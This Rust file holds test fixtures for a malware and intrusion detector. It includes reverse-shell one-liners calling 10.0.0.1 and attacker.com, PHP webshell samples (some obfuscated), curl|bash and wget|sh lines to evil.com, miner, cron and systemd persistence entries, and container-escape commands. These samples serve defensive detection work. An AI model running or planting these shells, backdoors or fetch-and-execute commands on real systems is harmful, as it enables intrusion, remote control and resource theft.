//! Test Fixtures and Sample Payloads
//!
//! Contains realistic test data for all detection scenarios.
//! These are sanitized versions of real malware patterns.

use std::collections::HashMap;

/// Real cryptominer command line patterns observed in the wild
pub fn miner_cmdlines() -> Vec<(&'static str, &'static str)> {
    vec![
        // XMRig variants
        ("xmrig", "./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u wallet -p x --threads=4"),
        ("xmrig_hidden", "./.hidden/miner -o stratum+ssl://pool.hashvault.pro:443"),
        ("xmrig_disguised", "/tmp/.X11-unix/systemd-network --algo cn/r -o stratum://monero.pool:3333"),

        // Disguised miners using legitimate names
        ("fake_systemd", "[systemd-journald] -o pool.supportxmr.com:3333"),
        ("fake_kworker", "[kworker/0:1] --donate-level=1 -o gulf.moneroocean.stream:10128"),

        // Pool connection patterns in arguments
        ("stratum_tcp", "/opt/app -c config.json -o stratum+tcp://xmr-eu1.nanopool.org:14444"),
        ("stratum_ssl", "./miner -o stratum+ssl://pool.minexmr.com:443 -u 4...wallet"),

        // Miners trying to blend in
        ("nginx_fake", "/usr/sbin/nginx -c /etc/nginx.conf --pool=randomx.xmrig.com"),
        ("apache_fake", "/usr/sbin/apache2 -k start --cpu-priority=0 -o stratum://"),
    ]
}

/// Real cryptominer process names observed in the wild
pub fn miner_process_names() -> Vec<&'static str> {
    vec![
        "xmrig",
        "xmr-stak",
        "minergate",
        "cpuminer",
        "ethminer",
        "cgminer",
        "bfgminer",
        "minerd",
        "ccminer",
        "nheqminer",
        "dwarfpool",
        "kthreaddk",      // Fake kernel thread
        "kdevtmpfsi",     // Common malware name
        "kinsing",        // Docker malware
        "kerberods",      // Persistence variant
    ]
}

/// Reverse shell patterns that should be detected
pub fn reverse_shell_cmdlines() -> Vec<(&'static str, &'static str)> {
    vec![
        // Bash reverse shells
        ("bash_tcp", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        ("bash_udp", "bash -i >& /dev/udp/attacker.com/53 0>&1"),

        // Netcat variants
        ("nc_basic", "nc -e /bin/sh 10.0.0.1 4444"),
        ("nc_alt", "nc attacker.com 4444 -e /bin/bash"),
        ("ncat_ssl", "ncat --ssl attacker.com 443 -e /bin/sh"),

        // Python reverse shells
        ("python_socket", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)'"),
        ("python3_reverse", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"),

        // Perl reverse shell
        ("perl_reverse", "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));'"),

        // PHP reverse shell
        ("php_reverse", "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),

        // Ruby reverse shell
        ("ruby_reverse", "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
    ]
}

/// Real webshell samples (sanitized/educational)
pub fn webshell_samples() -> Vec<(&'static str, &'static str)> {
    vec![
        // Simple eval shells
        ("simple_eval", r#"<?php eval($_GET['cmd']); ?>"#),
        ("simple_system", r#"<?php system($_POST['c']); ?>"#),
        ("simple_passthru", r#"<?php passthru($_REQUEST['x']); ?>"#),

        // China Chopper (one-liner)
        ("china_chopper", r#"<?php @eval($_POST['caidao']); ?>"#),
        ("china_chopper_v2", r#"<?php @eval($_POST['z']); ?>"#),

        // Base64 obfuscated
        ("b64_eval", r#"<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>"#),
        ("b64_nested", r#"<?php eval(base64_decode(base64_decode('YzNsemRHVnRLQ1JmUjBWVVd5ZGpKMTBwT3c9PQ=='))); ?>"#),

        // Gzinflate + base64 (packed shells)
        ("gzinflate_packed", r#"<?php eval(gzinflate(base64_decode('...'))); ?>"#),
        ("gzuncompress_packed", r#"<?php eval(gzuncompress(base64_decode('...'))); ?>"#),

        // ROT13 + base64
        ("rot13_b64", r#"<?php eval(str_rot13(base64_decode('...'))); ?>"#),

        // Dynamic function execution
        ("dynamic_func", r#"<?php $f = $_GET['f']; $f($_GET['c']); ?>"#),
        ("call_user_func", r#"<?php call_user_func($_POST['func'], $_POST['args']); ?>"#),

        // Variable variables
        ("var_var", r#"<?php $$_GET['a'] = $_GET['b']; eval($$_GET['a']); ?>"#),

        // Preg_replace with /e (PHP < 7.0)
        ("preg_replace_e", r#"<?php preg_replace('/.*/e', $_GET['code'], ''); ?>"#),

        // Create_function
        ("create_function", r#"<?php $func = create_function('', $_POST['code']); $func(); ?>"#),

        // Assert (code execution)
        ("assert_shell", r#"<?php @assert($_POST['x']); ?>"#),

        // include/require LFI->RCE
        ("include_lfi", r#"<?php include($_GET['page']); ?>"#),

        // WSO Shell signature
        ("wso_sig", r#"<?php $wso_version = "2.8"; /* FilesMan */ ?>"#),

        // c99 Shell signature
        ("c99_sig", r#"<?php $c99shell_version = "1.0"; c99sh_bindport(); ?>"#),

        // r57 Shell signature
        ("r57_sig", r#"<?php $r57shell = true; r57_cmd($_GET['c']); ?>"#),

        // b374k Shell signature
        ("b374k_sig", r#"<?php $b374k_config = array(); b374k_shell(); ?>"#),
    ]
}

/// Obfuscated webshell samples that should still be detected
pub fn obfuscated_webshells() -> Vec<(&'static str, String, u32)> {
    // (name, content, expected_min_obfuscation_score)
    vec![
        // Hex-encoded strings
        ("hex_encoded", r#"<?php $a = "\x73\x79\x73\x74\x65\x6d"; $a($_GET['c']); ?>"#.to_string(), 10),

        // chr() chains
        ("chr_chain", r#"<?php $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f($_POST['x']); ?>"#.to_string(), 15),

        // String concatenation abuse
        ("concat_abuse", r#"<?php $a='sy'.'st'.'em'; $a($_GET['c']); ?>"#.to_string(), 0),

        // Long base64 payload
        ("long_b64", format!(r#"<?php eval(base64_decode('{}')); ?>"#, "A".repeat(200)), 5),

        // Very long single line (>1000 chars)
        ("long_line", format!(r#"<?php {}eval($_GET['c']); ?>"#, " ".repeat(1500)), 10),

        // Multiple encoding layers
        ("multi_encode", r#"<?php eval(str_rot13(base64_decode(gzinflate(base64_decode('...'))))); ?>"#.to_string(), 25),

        // Variable variables with concatenation
        ("var_var_concat", r#"<?php ${'_'.'G'.'E'.'T'}['a']($_GET['c']); ?>"#.to_string(), 0),
    ]
}

/// Legitimate PHP code that should NOT trigger false positives
pub fn legitimate_php() -> Vec<(&'static str, &'static str)> {
    vec![
        // Laravel controller
        ("laravel_controller", r#"<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;

class UserController extends Controller
{
    public function index(Request $request)
    {
        $users = User::paginate(15);
        return view('users.index', compact('users'));
    }

    public function store(Request $request)
    {
        $validated = $request->validate([
            'name' => 'required|max:255',
            'email' => 'required|email|unique:users',
        ]);

        User::create($validated);
        return redirect()->route('users.index');
    }
}
?>"#),

        // WordPress plugin
        ("wordpress_plugin", r#"<?php
/*
Plugin Name: My Plugin
Description: A sample plugin
Version: 1.0
*/

function my_plugin_activate() {
    add_option('my_plugin_option', 'default');
}

add_action('wp_head', function() {
    echo '<meta name="generator" content="MyPlugin">';
});

function my_plugin_shortcode($atts) {
    return '<div class="my-plugin">' . esc_html($atts['content']) . '</div>';
}
add_shortcode('myplugin', 'my_plugin_shortcode');
?>"#),

        // Composer autoloader
        ("composer_autoload", r#"<?php
spl_autoload_register(function ($class) {
    $file = __DIR__ . '/src/' . str_replace('\\', '/', $class) . '.php';
    if (file_exists($file)) {
        require $file;
    }
});
?>"#),

        // CLI tool using system()
        ("cli_tool", r#"<?php
// This is a legitimate CLI tool
if (php_sapi_name() !== 'cli') {
    die('CLI only');
}

$command = $argv[1] ?? 'help';
$allowed = ['help', 'list', 'status'];

if (in_array($command, $allowed)) {
    // Safe: hardcoded command list
    system('git ' . $command);
}
?>"#),

        // Debug tool - Note: This SHOULD trigger because it contains eval() with input
        // Even though it's "safe" at runtime, static analysis cannot verify that
        // This is an intentional trade-off: prefer false positives over missed malware
        // Removed from "legitimate" examples since it's actually suspicious code
        //
        // If you need debug tools with eval(), they should be:
        // 1. Not deployed to production
        // 2. Protected by authentication
        // 3. Separated from web-accessible paths
    ]
}

/// Shellcode byte patterns (real shellcode signatures)
pub fn shellcode_patterns() -> Vec<(&'static str, Vec<u8>)> {
    vec![
        // x86_64 syscall instruction
        ("syscall_x64", vec![0x0f, 0x05]),

        // x86 int 0x80 syscall
        ("int80_x86", vec![0xcd, 0x80]),

        // NOP sled
        ("nop_sled", vec![0x90; 16]),

        // Common shellcode prologue (push rbp; mov rbp, rsp)
        ("prologue_x64", vec![0x55, 0x48, 0x89, 0xe5]),

        // x64 execve /bin/sh signature
        ("execve_binsh", vec![0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68]), // "/bin/sh"

        // Metasploit linux/x64/shell_reverse_tcp stub
        ("msf_reverse_tcp", vec![0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02]),

        // Socket creation pattern
        ("socket_create", vec![0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e]),
    ]
}

/// Persistence mechanism test cases
pub fn persistence_mechanisms() -> Vec<(&'static str, &'static str, &'static str)> {
    // (name, path, content)
    vec![
        // Cron jobs
        ("cron_miner", "/etc/cron.d/update", "* * * * * root /tmp/.x/miner -o pool:3333"),
        ("cron_reverse", "/var/spool/cron/crontabs/root", "@reboot bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),

        // Systemd units
        ("systemd_miner", "/etc/systemd/system/update.service", r#"[Service]
ExecStart=/tmp/.hidden/xmrig
Restart=always"#),

        // SSH authorized_keys
        ("ssh_backdoor", "/root/.ssh/authorized_keys", "ssh-rsa AAAA... attacker@evil.com"),

        // LD_PRELOAD
        ("ld_preload", "/etc/ld.so.preload", "/lib/malicious.so"),

        // Profile backdoor
        ("profile_backdoor", "/etc/profile.d/update.sh", "nohup /tmp/miner &"),

        // rc.local
        ("rc_local", "/etc/rc.local", "#!/bin/bash\n/tmp/.x/persistence &"),

        // init.d
        ("init_d", "/etc/init.d/networking-helper", "#!/bin/bash\n/opt/.sys/miner start"),
    ]
}

/// Known mining pool domains and IPs
pub fn mining_pool_indicators() -> Vec<&'static str> {
    vec![
        // Domains
        "pool.minexmr.com",
        "xmr.nanopool.org",
        "moneroocean.stream",
        "supportxmr.com",
        "pool.hashvault.pro",
        "gulf.moneroocean.stream",
        "randomx.xmrig.com",
        "xmr-eu1.nanopool.org",
        "xmr-asia1.nanopool.org",
        "stratum+tcp://",
        "stratum+ssl://",

        // Known malicious IPs (example ranges - sanitized)
        "185.165.168.",
        "89.144.25.",
        "194.36.189.",
    ]
}

/// C2 (Command and Control) indicators
pub fn c2_indicators() -> Vec<(&'static str, &'static str)> {
    vec![
        // Cobalt Strike default ports
        ("cobalt_http", "443"),
        ("cobalt_dns", "53"),

        // Metasploit default
        ("msf_default", "4444"),

        // Common backdoor ports
        ("backdoor_1", "1337"),
        ("backdoor_2", "31337"),
        ("backdoor_3", "6666"),

        // Suspicious process + network combinations
        ("suspicious_curl", "curl -s http://evil.com/payload | bash"),
        ("suspicious_wget", "wget -q -O- http://evil.com/mine.sh | sh"),
    ]
}

/// Suspicious paths that should trigger execution alerts
pub fn suspicious_execution_paths() -> Vec<&'static str> {
    vec![
        "/tmp/",
        "/var/tmp/",
        "/dev/shm/",
        "/run/",
        "/tmp/.X11-unix/",
        "/tmp/.ICE-unix/",
        "/var/run/",
        "/run/user/",
    ]
}

/// Fake kernel thread names used by malware
pub fn fake_kernel_threads() -> Vec<&'static str> {
    vec![
        "[kworker/0:0]",
        "[kworker/1:1]",
        "[kthreadd]",
        "[migration/0]",
        "[ksoftirqd/0]",
        "[kdevtmpfs]",
        "[netns]",
        "[khungtaskd]",
        "[kswapd0]",
        "[kauditd]",
    ]
}

/// Container escape attempt indicators
pub fn container_escape_indicators() -> Vec<(&'static str, &'static str)> {
    vec![
        // Privileged container operations
        ("mount_host", "mount /dev/sda1 /mnt"),
        ("nsenter_host", "nsenter --target 1 --mount --uts --ipc --net --pid"),
        ("docker_sock", "docker -H unix:///var/run/docker.sock run -v /:/host"),

        // Kernel exploitation
        ("dirty_cow", "dirtycow"),
        ("dirty_pipe", "dirtypipe"),
        ("overlayfs", "overlayfs exploit"),

        // cgroup escape
        ("cgroup_escape", "echo 1 > /sys/fs/cgroup/release_agent"),
        ("notify_on_release", "notify_on_release"),
    ]
}

/// Memory injection patterns
pub fn memory_injection_indicators() -> HashMap<&'static str, Vec<u8>> {
    let mut map = HashMap::new();

    // ptrace attach
    map.insert("ptrace_attach", vec![0x65, 0x10, 0x00, 0x00]); // PTRACE_ATTACH

    // process_vm_writev
    map.insert("vm_writev", vec![0x11, 0x01, 0x00, 0x00]); // syscall

    // LD_PRELOAD injection marker
    map.insert("ld_preload", b"LD_PRELOAD=".to_vec());

    map
}

/// eBPF-related threat indicators
pub fn ebpf_threat_indicators() -> Vec<(&'static str, &'static str)> {
    vec![
        // Suspicious kprobe targets
        ("getdents_hook", "sys_getdents"),
        ("getdents64_hook", "sys_getdents64"),
        ("tcp_hook", "tcp4_seq_show"),
        ("read_hook", "sys_read"),
        ("write_hook", "sys_write"),

        // Rootkit behavior
        ("hide_pid", "bpf_probe_read"),
        ("filter_output", "bpf_perf_event_output"),
    ]
}
